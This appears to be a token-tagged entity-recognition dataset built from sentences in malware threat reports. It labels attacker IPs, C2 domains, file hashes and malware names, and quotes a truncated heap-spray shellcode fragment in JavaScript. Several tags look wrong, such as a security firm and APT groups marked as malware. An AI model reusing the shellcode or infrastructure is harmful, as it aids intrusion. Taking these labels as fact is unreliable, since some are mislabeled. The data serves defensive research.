launched	O
,	O
but	O
is	O
password-protected	O
.	O

education-support.space	O
falcondefender.com	O
support-update.ml	O
such.market	O
support.mafy-koren.online	O
mafy.2waky.com	O
smail.otzo.com	O
ad.education-support.space	O
info.education-support.space	O
support.servecounterstrike.com	O
reme.otzo.com	O
supports.esmtp.biz	O
news.cloudns.cc	O
speed.ns01.biz	O
space.support-reg.space	O
mo.mefound.com	O
support.read-books.org	O
supports.3utilities.com	O
84.200.68.163	B-ip.unknown
23.229.3.70	B-ip.unknown
204.152.203.99	B-ip.unknown
192.52.167.118	B-ip.unknown
168.235.86.156	B-ip.unknown
167.160.36.101	B-ip.unknown
'	O
Free	O
Movies	O
'	O
<	O
Movie@mafy-koren.online	O
>	O
'	O
IDF	O
Survey	O
Research	O
Center..	O
'	O
<	O
info@mafy-koren.online	O
>	O
avynorton@gmail.com	O
59bab785127418972dda9da5571b73fd	B-hash
07dae7dada9ec3fa22507dfa5921c993	B-hash
4bd6a959cce13d1f5b5511a428e88c9c	B-hash
2ba0e52b885cabfbcd88866ab4072f54	B-hash
1d922e183418ac087933c526f7bd06c1	B-hash
3ce39f8afce9463c6d90c00ce72edb86	B-hash
77fd78042407a7318dba388da00700cc	B-hash

The	O
same	O
'	O
Tran	B-malware.backdoor
Duy	I-malware.backdoor
Linh	I-malware.backdoor
'	O
Microsoft	O
Word	O
Exploit	O
Kit	O
was	O
used	O
in	O
delivery	O
of	O
this	O
backdoor	O
.	O

Therefore	O
,	O
by	O
waiting	O
5	O
seconds	O
before	O
continuing	O
the	O

C2	O
domain	O
name	O
2	O
.	O

What	O
follows	O
is	O
four	O
examples	O
,	O
and	O
a	O
complete	O
list	O
is	O
available	O
in	O
the	O
Indicators	O
of	O
Compromise	O
section	O
at	O
the	O
end	O
of	O
the	O
blog	O
.	O

AV	O
detection	O

-	O
enumerates	O
logical	O
files	O
using	O
FindFirst	O
FindNext	O
technique	O
#	O
delfile-	O
deletes	O
a	O
file	O
using	O
the	O
DeleteFileA	O
API	O
#	O
newupload	O
?	O

4	O
2016년	O
말부터는	O
군사	O
정보	O
유출에서	O
금전적	O
이익	O
획득으로	O
공격을	O
확장한다	O
.	O

Various	O
subdomains	O
of	O
the	O
domain	O
winsupdate.com	B-url.unknown
have	O
pointed	O
to	O
several	O
IPs	O
pointed	O
to	O
by	O
the	O
Mutter	B-malware.backdoor
domains	O
.	O

The	O
implant	O
establishes	O
an	O
encrypted	O
channel	O
to	O
the	O
following	O
URL	O
path	O
:	O
hxxps://www.thlsystems.for rst.cz:443/components/com_tags/views/admin/get.php	B-url.unknown
An	O
image	O
from	O
December	O
30	O
,	O
2017	O
.	O

Figure	O
6	O
shows	O
that	O
using	O
request	O
of	O
HTTP	O
GET	O
to	O
get	O
file	O
:	O
http://146.0.43.107/hfYn	B-url.unknown
.	O

A	O
noteworthy	O
addition	O
to	O
the	O
Poseidon	B-malware.infosteal
toolkit	O
is	O
the	O
IGT	O
supertool	O
(	O
Information	O
Gathering	O
toolkit	O
)	O
,	O
a	O
bulking	O
15	O
megabyte	O
executable	O
that	O
orchestrates	O
a	O
series	O
of	O
different	O
information	O
collections	O
steps	O
,	O
exfiltration	O
,	O
and	O
the	O
cleanup	O
of	O
components	O
.	O

The	O
malware	O
deploys	O
a	O
granular	O
solution	O
for	O
Antivirus	O
software	O
,	O
tailored	O
to	O
the	O
AV	O
present	O
on	O
the	O
infected	O
machine	O
.	O

This	O
human	O
and	O
the	O
organization	O
represented	O
is	O
the	O
true	O
threat	O
that	O
is	O
targeting	O
information	O
for	O
the	O
purposes	O
of	O
fi	O
nancial	O
gain	O
,	O
theft	O
of	O
state	O
secrets	O
,	O
and	O
theft	O
of	O
intellectual	O
property	O
.	O

The	O
'	O
girls	O
'	O
probably	O
would	O
have	O
stopped	O
talking	O
to	O
them	O
,	O
but	O
that	O
would	O
have	O
been	O
for	O
their	O
own	O
good	O
!	O

일부	O
공격	O
사례에서는	O
해당	O
소프트웨어를	O
사용하는	O
모든	O
사용자를	O
감염시키는	O
것이	O
아니라	O
접속하는	O
IP	O
주소를	O
확인해	O
원하는	O
시스템만	O
감염시키는	O
방식을	O
사용했다	O
.	O

Malware	O
authors	O
test	O
concepts	O
using	O
commercial	O
simulation	O
software	O
.	O

Our	O
team	O
of	O
highly	O
experienced	O
cyber	O
infoworkers	O
,	O
analysts	O
and	O
researchers	O
constantly	O
run	O
a	O
targeted	O
and	O
extensive	O
evaluation	O
of	O
cyber	O
threats	O
and	O
risks	O
.	O

Conclusion	O

For	O
more	O
information	O
,	O
visit	O
www.trendmicro.com	O
.	O

If	O
the	O
additional	O
tools	O
are	O
not	O
installed	O
on	O
the	O
virtual	O
machine	O
the	O
malware	O
can	O
be	O
perfectly	O
executed	O
.	O

The	O
hook	O
gets	O
windows	O
messages	O
indicating	O
when	O
a	O
network	O
drive	O
has	O
been	O
attached	O
.	O

GET	O
/design/dfbox/list.jsp?action=What&u=10729854751740	O
HTTP/1.1	O
Connection	O
:	O
Keep-Alive	O
User-Agent	O
:	O
Mozilla/5.0	O
(	O
Windows	O
NT	O
6.1	O
;	O
Win64	O
;	O
x64	O
;	O
rv:47.0	O
)	O
Gecko/20100101	O
Firefox/47.0	O
Host	O
:	O
www.eye-watch[.]in	B-url.cncsvr

Here	O
are	O
some	O
questions	O
you	O
may	O
want	O
to	O
ask	O
your	O
organization	O
to	O
help	O
prevent	O
and	O
mitigate	O
against	O
attacks	O
.	O

The	O
head	O
of	O
Germany	O
's	O
domestic	O
intelligence	O
agency	O
,	O
Bundesamt	O
für	O
Ver-fassungsschutz	O
(	O
BfV	O
)	O
,	O
also	O
attributed	O
the	O
June	O
2015	O
compromise	O
of	O
the	O
Bundestag	O
's	O
networks	O
to	O
APT28	B-malware.infosteal
.	O

The	O
Download	O
Server	O
–	O
'	O
down.pzchao	B-url.unknown
'	O

The	O
dropper	O
does	O
not	O
really	O
check	O
what	O
android	O
version	O
is	O
installed	O
:	O
The	O
message	O
is	O
intended	O
to	O
make	O
the	O
victim	O
believe	O
that	O
the	O
Pokemon	O
game	O
does	O
not	O
work	O
because	O
of	O
compatibility	O
issues	O
.	O

While	O
tracking	O
this	O
APT	O
activity	O
,	O
Volexity	B-malware.backdoor
has	O
also	O
come	O
across	O
other	O
seemingly	O
unrelated	O
compromises	O
of	O
websites	O
in	O
Hong	O
Kong	O
and	O
Japan	O
associated	O
with	O
the	O
java-se.com	B-url.normal
activity	O
.	O

The	O
opinions	O
,	O
statements	O
,	O
and	O
assessments	O
in	O
this	O
report	O
are	O
solely	O
those	O
of	O
the	O
individual	O
author	O
(	O
s	O
)	O
and	O
do	O
not	O
constitute	O
legal	O
advice	O
,	O
nor	O
do	O
they	O
necessarily	O
reflect	O
the	O
views	O
of	O
Accenture	O
,	O
its	O
subsidiaries	O
,	O
or	O
affiliates	O
.	O

When	O
it	O
is	O
run	O
,	O
the	O
program	O
actually	O
dumps	O
out	O
dummy	O
certificate	O
files	O
into	O
the	O
file	O
system	O
and	O
,	O
again	O
,	O
this	O
can	O
be	O
very	O
convincing	O
to	O
an	O
analyst	O
who	O
is	O
initially	O
researching	O
the	O
file	O
.	O

Figure	O
25	O
:	O
Partial	O
List	O
of	O
Victims	O

In	O
2015	O
and	O
2016	O
,	O
two	O
Vietnamese	O
media	O
outlets	O
were	O
targeted	O
with	O
malware	O
that	O
FireEye	O
assesses	O
to	O
be	O
unique	O
to	O
APT32	B-malware.infosteal
.	O

The	O
IEC	O
builds	O
,	O
maintains	O
,	O
and	O
operates	O
power	O
generation	O
stations	O
,	O
sub-stations	O
,	O
as	O
well	O
as	O
transmission	O
and	O
distribution	O
networks	O
.	O

41454B390B73A45004B916B96C693312	B-hash
javaupdate.no-ip.info	B-url.cncsvr

Get	O
information	O
and	O
insight	O
on	O
today	O
's	O
advanced	O
threats	O
from	O
the	O
leader	O
in	O
advanced	O
threat	O
prevention	O
.	O

In	O
2016	O
we	O
saw	O
fully	O
functional	O
,	O
very	O
large	O
SPLM/X-Agent	B-malware.backdoor
modules	O
supporting	O
OS	O
The	O
executable	O
module	O
continues	O
to	O
be	O
part	O
of	O
a	O
framework	O
supporting	O
various	O
internal	O
and	O
external	O
components	O
communicating	O
over	O
internal	O
and	O
external	O
channels	O
,	O
maintaining	O
slightly	O
morphed	O
encryption	O
and	O
functionality	O
per	O
deployment	O
.	O

http://www.symantec.com/connect/blogs/spammers-use-kenya-terrorist-attack-spread-malware	B-url.normal
8	O
.	O

We	O
have	O
observed	O
the	O
Moafee	B-malware.infosteal
group	O
target	O
the	O
governments	O
and	O
militaries	O
of	O
countries	O
with	O
national	O
interests	O
in	O
the	O
South	O
China	O
Sea	O
.	O

그러나	O
2017년에	O
발견된	O
변형은	O
'	O
Anonymous	B-malware.unknown
?	O
'	O

Macguire	O
,	O
Eoghan	O
.	O

FINFISHER	B-malware.backdoor
:	O
UPDATED	O
GLOBAL	O
SCAN	O

1	O
dvdform.com	B-url.unknown
.	O

The	O
z1	O
is	O
cmd	O
,	O
and	O
z2	O
contains	O
the	O
arguments	O
to	O
the	O
command	O
prompt	O
sent	O
via	O
cmd	O
/c	O
.	O

Connections	O
from	O
these	O
IPs	O
may	O
be	O
performing	O
vulnerability	O
scans	O
attempting	O
to	O
identify	O
websites	O
that	O
are	O
vulnerable	O
to	O
cross-site	O
scripting	O
(	O
XSS	O
)	O
or	O
Structured	O
Query	O
Language	O
(	O
SQL	O
)	O
injection	O
attacks	O
.	O

'	O
Pending	O
'	O
,	O
only	O
if	O
the	O
command	O
string	O
matches	O
with	O
string	O
'	O
Pending	O
'	O
then	O
the	O
malware	O
downloads	O
the	O
updated	O
executable	O
from	O
the	O
extracted	O
URL	O
.	O

Bandook	B-malware.unknown
makes	O
use	O
of	O
a	O
common	O
technique	O
referred	O
to	O
as	O
'	O
process	O
hollowing	O
.	O
'	O

Customized	O
Outlook	O
Credentials	O
Dumper	O
–	O
Inspired	O
by	O
known	O
Outlook	O
credentials	O
dumpers	O
.	O

In	O
this	O
case	O
,	O
the	O
attachment	O
is	O
a	O
Microsoft	O
Word	O
document	O
which	O
tries	O
to	O
exploit	O
the	O
vulnerability	O
described	O
in	O
CVE-2012-0158	O
in	O
order	O
to	O
drop	O
and	O
execute	O
malware	O
dubbed	O
'	O
Kraken	B-malware.ransom
HTTP	I-malware.ransom
'	O
.	O

The	O
server	O
has	O
been	O
active	O
since	O
August	O
2015	O
.	O

Figure	O
3.Infrastructure	O
and	O
Entites	O
Related	O
to	O
Cmstar	B-malware.unknown
As	O
seen	O
in	O
the	O
chart	O
above	O
,	O
the	O
C2	O
domain	O
'	O
happy.launchtrue[.]com	B-url.unknown
'	O
was	O
originally	O
registered	O
using	O
the	O
email	O
address	O
'	O
WANGMINGHUA6@GMAIL[.]COM	B-url.unknown
'	O
.	O

By	O
default	O
,	O
Windows	O
Explorer	O
shows	O
only	O
the	O
'	O
Date	O
Modified	O
'	O
field	O
.	O

Figure	O
15	O
:	O

FireEye	O
MVX	O
and	O
HX	O
Endpoint	O
Security	O
technology	O
successfully	O
detect	O
this	O
code	O
execution	O
technique	O
.	O

It	O
's	O
likely	O
they	O
'll	O
continue	O
their	O
heist	O
attempts	O
against	O
banks	O
in	O
the	O
coming	O
months	O
and	O
we	O
expect	O
they	O
will	O
evolve	O
their	O
modus	O
operandi	O
to	O
incorporate	O
new	O
ways	O
of	O
disrupting	O
victims	O
(	O
and	O
possibly	O
the	O
wider	O
community	O
)	O
from	O
responding	O
.	O

10418450096179084191	O
11696648495248868788	O
13367542350555075590	O
17798583036840002648	O
17362149250016288818	O
11008990750836915855	O
12430448762037889566	O
12941986373589998425	O
14237693369114233902	O
15175240657458101230	O
18263349974554467657	O
10031168301806868687	O
12450086912549212859	O
13469158752397659430	O
13887786183890428647	O
15448206077875179259	O
15525317917180712785	O
16639512314094306104	O
10671561344391424094	O
14360088739535268901	O
16495367076336282102	O
15684750702817909758	O
17908820252718507450	O
10302454590553748328	O

Television	O
broadcasters	O
YTN	O
,	O
MBC	O
,	O
and	O
banks	O
KBS	O
,	O
Shinhan	O
,	O
Nonghyup	O
,	O
and	O
Jeju	O
were	O
targeted	O
in	O
this	O
recent	O
attack	O
.	O

If	O
the	O
request	O
and	O
the	O
Via	O
field	O
exist	O
,	O
the	O
server	O
variant	O
authenticates	O
the	O
client	O
and	O
responds	O
with	O

I	O
did	O
n't	O
think	O
much	O
of	O
it	O
and	O
quickly	O
moved	O
on	O
after	O
a	O
cursory	O
analysis	O
.	O

public	O
availability	O
of	O
the	O
Metasploit	O
module	O
'	O
ie_aurora.rb	O
'	O
.	O

The	O
request	O
structure	O
is	O
slightly	O
different	O
in	O
that	O
it	O
uses	O
the	O
base64	O
alphabet	O
'	O
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*	O
'	O
.	O

Initially	O
,	O
the	O
username	O
used	O
on	O
the	O
server	O
was	O
arnoldrex	O
.	O

In	O
case	O
of	O
mha-report.doc	O
the	O
malicious	O
activity	O
triggered	O
only	O
when	O
the	O
show	O
document	O
button	O
was	O
clicked	O
,	O
when	O
this	O
event	O
occurs	O
the	O
macro	O
code	O
calls	O
a	O
subroutine	O
CommandButton1_Click	O
(	O
)	O
which	O
in	O
turn	O
calls	O
a	O
malicious	O
obfuscated	O
function	O
(	O
Bulbaknopka	O
(	O
)	O
)	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

The	O
domain	O
jeojang.ga	O
was	O
registered	O
via	O
Freenom	O
,	O
a	O
free	O
anonymous	O
domain	O
provider	O
.	O

In	O
another	O
investigation	O
,	O
APT32	B-malware.infosteal
compromised	O
the	O
McAfee	O
ePO	O
infrastructure	O
to	O
distribute	O
their	O
malware	O
as	O
a	O
software	O
deployment	O
task	O
in	O
which	O
all	O
systems	O
pulled	O
the	O
payload	O
from	O
the	O
ePO	O
server	O
using	O
the	O
proprietary	O
SPIPE	O
protocol	O
.	O

The	O
functionality	O
code	O
of	O
the	O
scripts	O
embedded	O
in	O
this	O
PE	O
sample	O
is	O
completely	O
the	O
same	O
with	O
the	O
one	O
of	O
Shellcode	O
script	O
Antiy	O
has	O
acquired	O
,	O
while	O
the	O
encryption	O
data	O
of	O
them	O
differs	O
from	O
each	O
other	O
.	O

An	O
illustration	O
of	O
the	O
shared	O
network	O
infrastructure	O
between	O
Operation	B-malware.ransom
Manul	I-malware.ransom
and	O
Operation	O
Hangover	O
.	O

10.04.2015	O
:	O
Staying	O
alert	O
when	O
buying	O
banners	O
:	O
Google	O
's	O
advertising	O
service	O
misused	O
for	O
distributing	O
malware	O

<	O
html	O
>	O
<	O
head	O
>	O
<	O
script	O
>	O
var	O
sc	O
=	O
unescape	O
(	O
'	O
%	O
u9090	O
%	O
u19eb	O
%	O
u4b5b	O
%	O
u3390	O
%	O
u90c9	O
%	O
u7b80	O
%	O
ue901	O
%	O
u0175	O
%	O
u66c3	O
%	O
u7bb9	O
%	O
u8004	O
%	O
u0b34	O
%	O
ue2d8	O
%	O
uebfa	O
%	O
ue805	O
%	O
uffe2	O
%	O
uffff	O
%	O
u3931	O
%	O
ud8	O
db	O
%	O
u87d8	O
%	O
u79bc	O
%	O
ud8e8	O
%	O
ud8d8	O
%	O
u9853	O
%	O
u53d4	O
%	O
uc4a8	O
%	O
u5375	O
%	O
ud0b0	O
%	O
u2f53	O
%	O
ud7b2	O
%	O
u3081	O
%	O
udb59	O
%	O
ud8d8	O
%	O
u3a48	O
%	O
ub020	O
%	O
ueaeb	O
%	O
ud8d8	O
%	O
u8db0	O
%	O
ubdab	O
%	O
u	O
8caa	O
%	O
u9e53	O
%	O
u30d4	O
%	O
uda37	O
%	O
ud8d8	O
%	O
u3053	O
%	O
ud9b2	O
%	O
u308	O

The	O
attacker	O
left	O
a	O
lot	O
of	O
information	O
behind	O
,	O
which	O
allowed	O
us	O
to	O
analyse	O
files	O
used	O
by	O
this	O
MDM	B-malware.infosteal
.	O

The	O
latter	O
server	O
was	O
down	O
by	O
the	O
time	O
we	O
noticed	O
the	O
malware	O
,	O
but	O
games-playbox[.]com	B-url.cncsvr
still	O
resolved	O
to	O
the	O
IP	O

Examination	O
of	O
rootadmin2012.com	B-url.unknown
revealed	O
heapspray	O
and	O
shellcodes	O
with	O
references	O
to	O
Internet	O
Explorer	O
(	O
IE	O
)	O
.	O

f4e15c1c2c95c651423dbb4cbe6c8fd5	B-hash
-	O
bicorporate.dll	O
649ff144aea6796679f8f9a1e9f51479	B-hash
-	O
fundamentive.dll	O
40e70f7f5d9cb1a669f8d8f306113485	B-hash
-	O
papersaving.dll	O
58db8f33a9cdd321d9525d1e68c06456	B-hash
-	O
previliges.dll	O
f5476728deb53fe2fa98e6a33577a9da	B-hash
-	O
steinheimman.dll	O

For	O
the	O
attackers	O
,	O
this	O
infection	O
vector	O
is	O
not	O
interesting	O
anymore	O
.	O

MainConnectionIo	O
function	O
checks	O
if	O
the	O
Windows	O
Firewall	O
is	O
enabled	O
,	O
sets	O
the	O
Tcp	O
Keep	O
Alive	O
value	O
and	O
Non-blocking	O
mode	O
connection	O
options	O
and	O
receives	O
data	O
from	O
the	O
remote	O
host	O
through	O
the	O
ReceiveCommandData	O
function	O
.	O

Windows	O
service	O
program	O
To	O
do	O
this	O
they	O
pick	O
an	O
existing	O
,	O
non-critical	O
Windows	O
service	O
and	O
replace	O
its	O
registry	O
value	O
with	O
the	O
path	O
of	O
the	O
new	O
backdoor	O
's	O
binary	O
The	O
functionality	O
of	O
the	O
main	O
backdoor	O
that	O
works	O
as	O
a	O
Windows	O
service	O
is	O
the	O
same	O
as	O
just	O
described	O
However	O
,	O
there	O
are	O
two	O
small	O
differences	O
:	O
first	O
the	O
backdoor	O
's	O
version	O
is	O
1	O
1s	O
,	O
instead	O
of	O
1	O
1e	O
,	O
and	O
second	O
,	O
there	O
is	O
code	O
obfuscation	O
The	O
code	O
of	O
this	O
version	O
of	O
the	O
backdoor	O
is	O
mixed	O
with	O
junk	O
assembly	O
instructions	O
The	O
additional	O
backdoor	O
provides	O
an	O
alternative	O
persistence	O
mechanism	O
that	O
allows	O
the	O
attackers	O
to	O
regain	O
access	O
to	O
a	O
targeted	O
network	O
in	O
case	O
the	O
main	O
backdoor	O
is	O
detected	O
and/or	O
disabled	O
This	O
backdoor	O
is	O
a	O
trojanized	O
version	O
of	O
the	O
Windows	O
Notepad	O
application	O
This	O
is	O
a	O
fully	O
functional	O
version	O
of	O
the	O
application	O
,	O
but	O
the	O
malware	O
authors	O
have	O
inserted	O
malicious	O
code	O
that	O
is	O
executed	O
each	O
time	O
the	O
application	O
is	O
launched	O
Once	O
the	O
attackers	O
gain	O
administrator	O
privileges	O
,	O
they	O
are	O
able	O
to	O
replace	O
the	O
legitimate	O
Notepad	O
manually	O
The	O
inserted	O
malicious	O
code	O
is	O
heavily	O
obfuscated	O
,	O
but	O
once	O
the	O
code	O
is	O
decrypted	O
it	O
connects	O
to	O
a	O
remote	O
C	O
&	O
C	O
server	O
,	O
which	O
is	O
different	O
to	O
the	O
one	O
linked	O
in	O
the	O
main	O
backdoor	O
,	O
and	O
downloads	O
a	O
payload	O
This	O
is	O
in	O
the	O
form	O
of	O
shellcode	O
that	O
is	O
loaded	O
directly	O
into	O
memory	O
and	O
executed	O
In	O
addition	O
,	O
the	O
inserted	O
code	O
decrypts	O
the	O
original	O
Windows	O
Notepad	O
code	O
,	O
which	O
is	O
stored	O
at	O
the	O
end	O
of	O
the	O
file	O
,	O
and	O
then	O
passes	O
execution	O
to	O
it	O
Thus	O
,	O
the	O
Notepad	O
application	O
works	O
as	O
expected	O
This	O
component	O
is	O
a	O
separate	O
executable	O
responsible	O
for	O
launching	O
the	O
payloads	O
and	O
the	O
Data	O
wiper	O
component	O
The	O
Launcher	O
component	O
contains	O
a	O
specific	O
time	O
and	O
date	O
Analyzed	O
samples	O
contained	O
two	O
dates	O
,	O
17	O
December	O
2016	O
and	O
20	O
December	O
2016	O
Once	O
one	O
of	O
these	O
dates	O
is	O
reached	O
the	O
component	O
creates	O
two	O
threads	O
The	O
first	O
thread	O
makes	O
attempts	O
to	O
load	O
a	O
payload	O
DLL	O
,	O
while	O
the	O
second	O
thread	O
waits	O
one	O
or	O
two	O
hours	O
(	O
it	O
depends	O
on	O
the	O
Launcher	O
component	O
version	O
)	O
and	O
then	O
attempts	O
to	O
load	O
the	O
Data	O
wiper	O
component	O
The	O
priority	O
for	O
both	O
threads	O
is	O
set	O
to	O
,	O
which	O
means	O
that	O
these	O
two	O
threads	O
receive	O
a	O
higher	O
than	O
normal	O
share	O
of	O
CPU	O
resources	O
from	O
the	O
operating	O
system	O
The	O
name	O
of	O
the	O
payload	O
DLL	O
is	O
supplied	O
by	O
the	O
attackers	O
via	O
a	O
command	O
line	O
parameter	O
supplied	O
in	O
one	O
of	O
the	O
main	O
backdoor	O
's	O
'	O
execute	O
a	O
shell	O
command	O
'	O
commands	O
The	O
Data	O
wiper	O
component	O
is	O
always	O
named	O
The	O
expected	O
command	O
lines	O
are	O
of	O
the	O
form	O
:	O
Each	O
argument	O
on	O
the	O
command	O
line	O
represents	O
the	O
following	O
:	O
is	O
the	O
filename	O
of	O
the	O
Launcher	O
component	O
is	O
the	O
directory	O
where	O
the	O
payload	O
DLL	O
and	O
configuration	O
is	O
stored	O
is	O
the	O
filename	O
of	O
the	O
payload	O
DLL	O
is	O
the	O
file	O
that	O
stores	O
configuration	O
data	O
for	O
the	O
specified	O
payload	O
The	O
path	O
to	O
this	O
file	O
is	O
supplied	O
to	O
the	O
payload	O
DLL	O
by	O
the	O
Launcher	O
component	O
The	O
payload	O
and	O
Data	O
wiper	O
components	O
are	O
standard	O
Windows	O
DLL	O
files	O
In	O
order	O
to	O
be	O
loaded	O
by	O
the	O
Launcher	O
component	O
they	O
must	O
export	O
a	O
function	O
named	O
as	O
seen	O
in	O
Figure	O
5	O
Windows	O
device	O
names	O
(	O
usually	O
COM	O
ports	O
)	O
,	O
the	O
number	O
of	O
Information	O
Object	O
Address	O
(	O
IOA	O
)	O
ranges	O
,	O
and	O
the	O
beginning	O
and	O
ending	O
IOA	O
values	O
for	O
the	O
specified	O
number	O
of	O
IOA	O
ranges	O
IOA	O
is	O
a	O
number	O
that	O
identifies	O
a	O
particular	O
data	O
element	O
in	O
the	O
device	O
Figure	O
6	O
illustrates	O
a	O
101	O
payload	O
configuration	O
file	O
with	O
two	O
defined	O
IOA	O
ranges	O
,	O
10-15	O
and	O
20-25	O

Stuxnet	B-malware.backdoor
(	O
2007-2010	O
)	O

The	O
encryption	O
algorithm	O
used	O
is	O
AES	O
(	O
Advanced	O
Encryption	O
Standard	O
)	O
with	O
128-bit	O
keys	O
.	O

Interestingly	O
,	O
the	O
original	O
size	O
of	O
this	O
particular	O
DLL	O
is	O
around	O
160	O
kilobytes	O
,	O
although	O
the	O
PE	O
headers	O
already	O
indicate	O
its	O
future	O
size	O
as	O
shown	O
below	O
.	O

Adversary	O
IOC	O
Type	O
Additional	O
Info	O

2	O
Jan	O
.	O

Unit	O
42	O
created	O
a	O
Yara	O
signature	O
to	O
detect	O
Cmstar	B-malware.unknown
samples	O
based	O
on	O
these	O
debugging	O
strings	O
,	O
which	O
is	O
available	O
in	O
the	O
appendix	O
.	O

101.55.33.39	B-ip.unknown
103.232.215.144	B-ip.unknown
103.246.245.147	B-ip.unknown
111.68.8.130	B-ip.unknown
112.125.17.103	B-ip.unknown
113.10.148.161	B-ip.unknown
113.10.148.205	B-ip.unknown
122.10.18.166	B-ip.unknown
122.10.36.94	B-ip.unknown
122.10.41.85	B-ip.unknown
122.10.83.75	B-ip.unknown
122.10.85.35	B-ip.unknown
122.9.247.128	B-ip.unknown
122.9.247.134	B-ip.unknown
122.9.247.216	B-ip.unknown
122.9.247.56	B-ip.unknown
123.254.111.87	B-ip.unknown
142.4.103.90	B-ip.unknown
174.128.255.228	B-ip.unknown
175.45.192.234	B-ip.unknown
202.172.32.172	B-ip.unknown
202.174.130.116	B-ip.unknown
203.232.28.10	B-ip.unknown
209.85.84.165	B-ip.unknown
209.85.84.167	B-ip.unknown
31.170.179.179	B-ip.unknown
58.64.187.22	B-ip.unknown
60.215.128.246	B-ip.unknown
64.111.220.218	B-ip.unknown

axroot.com	B-url.unknown
kaliex.net	B-url.unknown
adobeair.net	B-url.unknown
mangoco.net	B-url.unknown
jaysonj.no-ip.biz	B-url.unknown
orange2015.net	B-url.unknown
accountslogin.services	B-url.unknown
adobeinstall.com	B-url.unknown
adobe-flashviewer.accountslogin.services	B-url.unknown
dropboxonline.com	B-url.unknown
The	O
following	O
are	O
hashes	O
of	O
malware	O
samples	O
discovered	O
during	O
our	O
research	O
which	O
are	O
associated	O
with	O
Operation	B-malware.ransom
Manul	I-malware.ransom
.	O

4.1	O
Summary	O
........................................	O
4.2	O
Techniques	O
used	O
....................................	O
Implemented	O
commands	O
................................	O
4.4	O
Control	O
.........................................	O
IOC	O
...........................................	O
4.5.1	O
Network	O
.....................................	O
4.5.2	O
Registry	O
.....................................	O
4.6	O
Persistency	O
.......................................	O
4.7	O
Execution	O
process	O
....................................	O

Currently	O
we	O
do	O
not	O
know	O
who	O
is	O
behind	O
Operation	O
Electric	O
Powder	O
or	O
what	O
its	O
objectives	O
are	O
.	O

This	O
application	O
is	O
used	O
for	O
reviewing	O
logs	O
and	O
is	O
a	O
part	O
of	O
the	O
TriStation	O
application	O
suite	O
.	O

This	O
sample	O
transmitted	O
the	O
static	O
five	O
byte	O
packet	O
flag	O
'	O
XYTvn	O
'	O
.	O

Figure	O
13	O
shows	O
this	O
representation	O
for	O
a	O
Victim	O
system	O
using	O
the	O
Volume	O
Serial	O
Number	O
:	O
'	O
B326-4EBC	O
'	O
.	O

The	O
ever-shifting	O
threats	O
and	O
increasingly	O
expanding	O
attack	O
surface	O
will	O
challenge	O
users	O
and	O
enterprises	O
to	O
catch	O
up	O
with	O
their	O
security	O
.	O

When	O
successfully	O
decrypted	O
,	O
the	O
file	O
is	O
saved	O
into	O
the	O
same	O
directory	O
as	O
the	O
initial	O
executable	O
.	O

In	O
this	O
campaign	O
we	O
identified	O
five	O
applications	O
that	O
have	O
been	O
distributed	O
by	O
this	O
system	O
to	O
the	O
13	O
targeted	O
devices	O
in	O
India	O
.	O

Operation	O
BugDrop	O
infects	O
its	O
victims	O
using	O
targeted	O
email	O
phishing	O
attacks	O
and	O
malicious	O
macros	O
embedded	O
in	O
Microsoft	O
Office	O
attachments	O
.	O

Poseidon	B-malware.infosteal
's	O
toolkit	O
displays	O
an	O
awareness	O
of	O
many	O
antivirus	O
providers	O
over	O
the	O
years	O
,	O
attempting	O
to	O
attack	O
or	O
spoof	O
these	O
processes	O
as	O
a	O
means	O
of	O
self­defense	O
for	O
their	O
infections	O
.	O

Between	O
2012	O
and	O
2014	O
,	O
the	O
authors	O
of	O
CozyDuke	B-malware.drop
appear	O
to	O
have	O
performed	O
significant	O
refactoring	O
of	O
the	O
CozyDuke	B-malware.drop
codebase	O
,	O
even	O
though	O
functionally	O
the	O
differences	O
are	O
smaller	O
.	O

The	O
attachments	O
we	O
analyzed	O
sent	O
data	O
to	O
a	O
command	O
&	O
control	O
server	O
inside	O
Bahrain	O
.	O

9C39D6F52E1E1BE5AE61BAB90971D054	B-hash
natco3.no-ip.net	B-url.cncsvr
US	O

The	O
group	O
will	O
 rst	O
email	O
the	O
target	O
a	O
malicious	O
'	O
Reconnaissance	O
document	O
'	O
which	O
,	O
if	O
opened	O
,	O
will	O
 ngerprint	O
the	O
target	O
computer	O
(	O
https://securelist.com/an-undocumented-word-feature-abused-by-attackers/81899/	B-url.unknown
)	O
,	O
gathering	O
information	O
on	O
what	O
software	O
it	O
is	O
running	O
and	O
whether	O
that	O
software	O
is	O
up	O
to	O
date	O
.	O

Cobalt	O
Strike2.3	O
Compiled	O
the	O
DNS	O
field	O
of	O
Beacon	O
with	O
customized	O
encoder	O
.	O

The	O
new	O
leaders	O
of	O
Iran	O
also	O
established	O
an	O
intelligence	O
and	O
security	O
organization	O
,	O
the	O
Islamic	O
Revolutionary	O
Guard	O
Corps	O
(	O
IRGC	O
)	O
,	O
'	O
charged	O
with	O
defending	O
the	O
Islamic	O
Republic	O
against	O
internal	O
and	O
external	O
threats	O
.	O
'	O

Below	O
screen	O
shot	O
shows	O
the	O
network	O
traffic	O
of	O
malware	O
trying	O
to	O
download	O
the	O
executable	O
file	O
from	O
the	O
extracted	O
URL	O
.	O

The	O
second	O
file	O
extracted	O
from	O
the	O
archive	O
is	O
a	O
CozyDuke	B-malware.drop
dropper	O
.	O

page	O
|	O
6	O

Another	O
similar	O
sample	O
was	O
referenced	O
by	O
the	O
'	O
contagio	O
'	O
blog	O
8	O
and	O
used	O
the	O
password	O
'	O
8861	O
'	O
.	O

inocnation[.]com	B-url.unknown
mail.cbppnews[.]com	B-url.unknown
1a53b0cp32e46g0qio9	O

fb98c8406e316efb0f46024f7c6a6739	B-hash
Server	O
Platino9	O

Our	O
OSINT	O
research	O
identified	O
a	O
single	O
domain	O
,	O
mabna-ins[.]ir	B-url.unknown
,	O
which	O
could	O
correspond	O
to	O
the	O
group	O
.	O

前端技术	O
(	O
4	O
)	O

For	O
example	O
,	O
one	O
of	O
the	O
command	O
and	O
control	O
servers	O
,	O
mafy.2waky[.]com	O
,	O
serves	O
content	O
copied	O
from	O
a	O
legitimate	O
unrelated	O
website	O
-	O
radaronline.com	B-url.unknown
.	O

From	O
all	O
the	O
samples	O
that	O
we	O
managed	O
to	O
obtain	O
,	O
we	O
extracted	O
the	O
following	O
email	O
accounts	O
used	O
in	O
this	O
campaign	O
:	O

'	O
According	O
to	O
Roscomnadzor	O
prescript	O
you	O
should	O
block	O
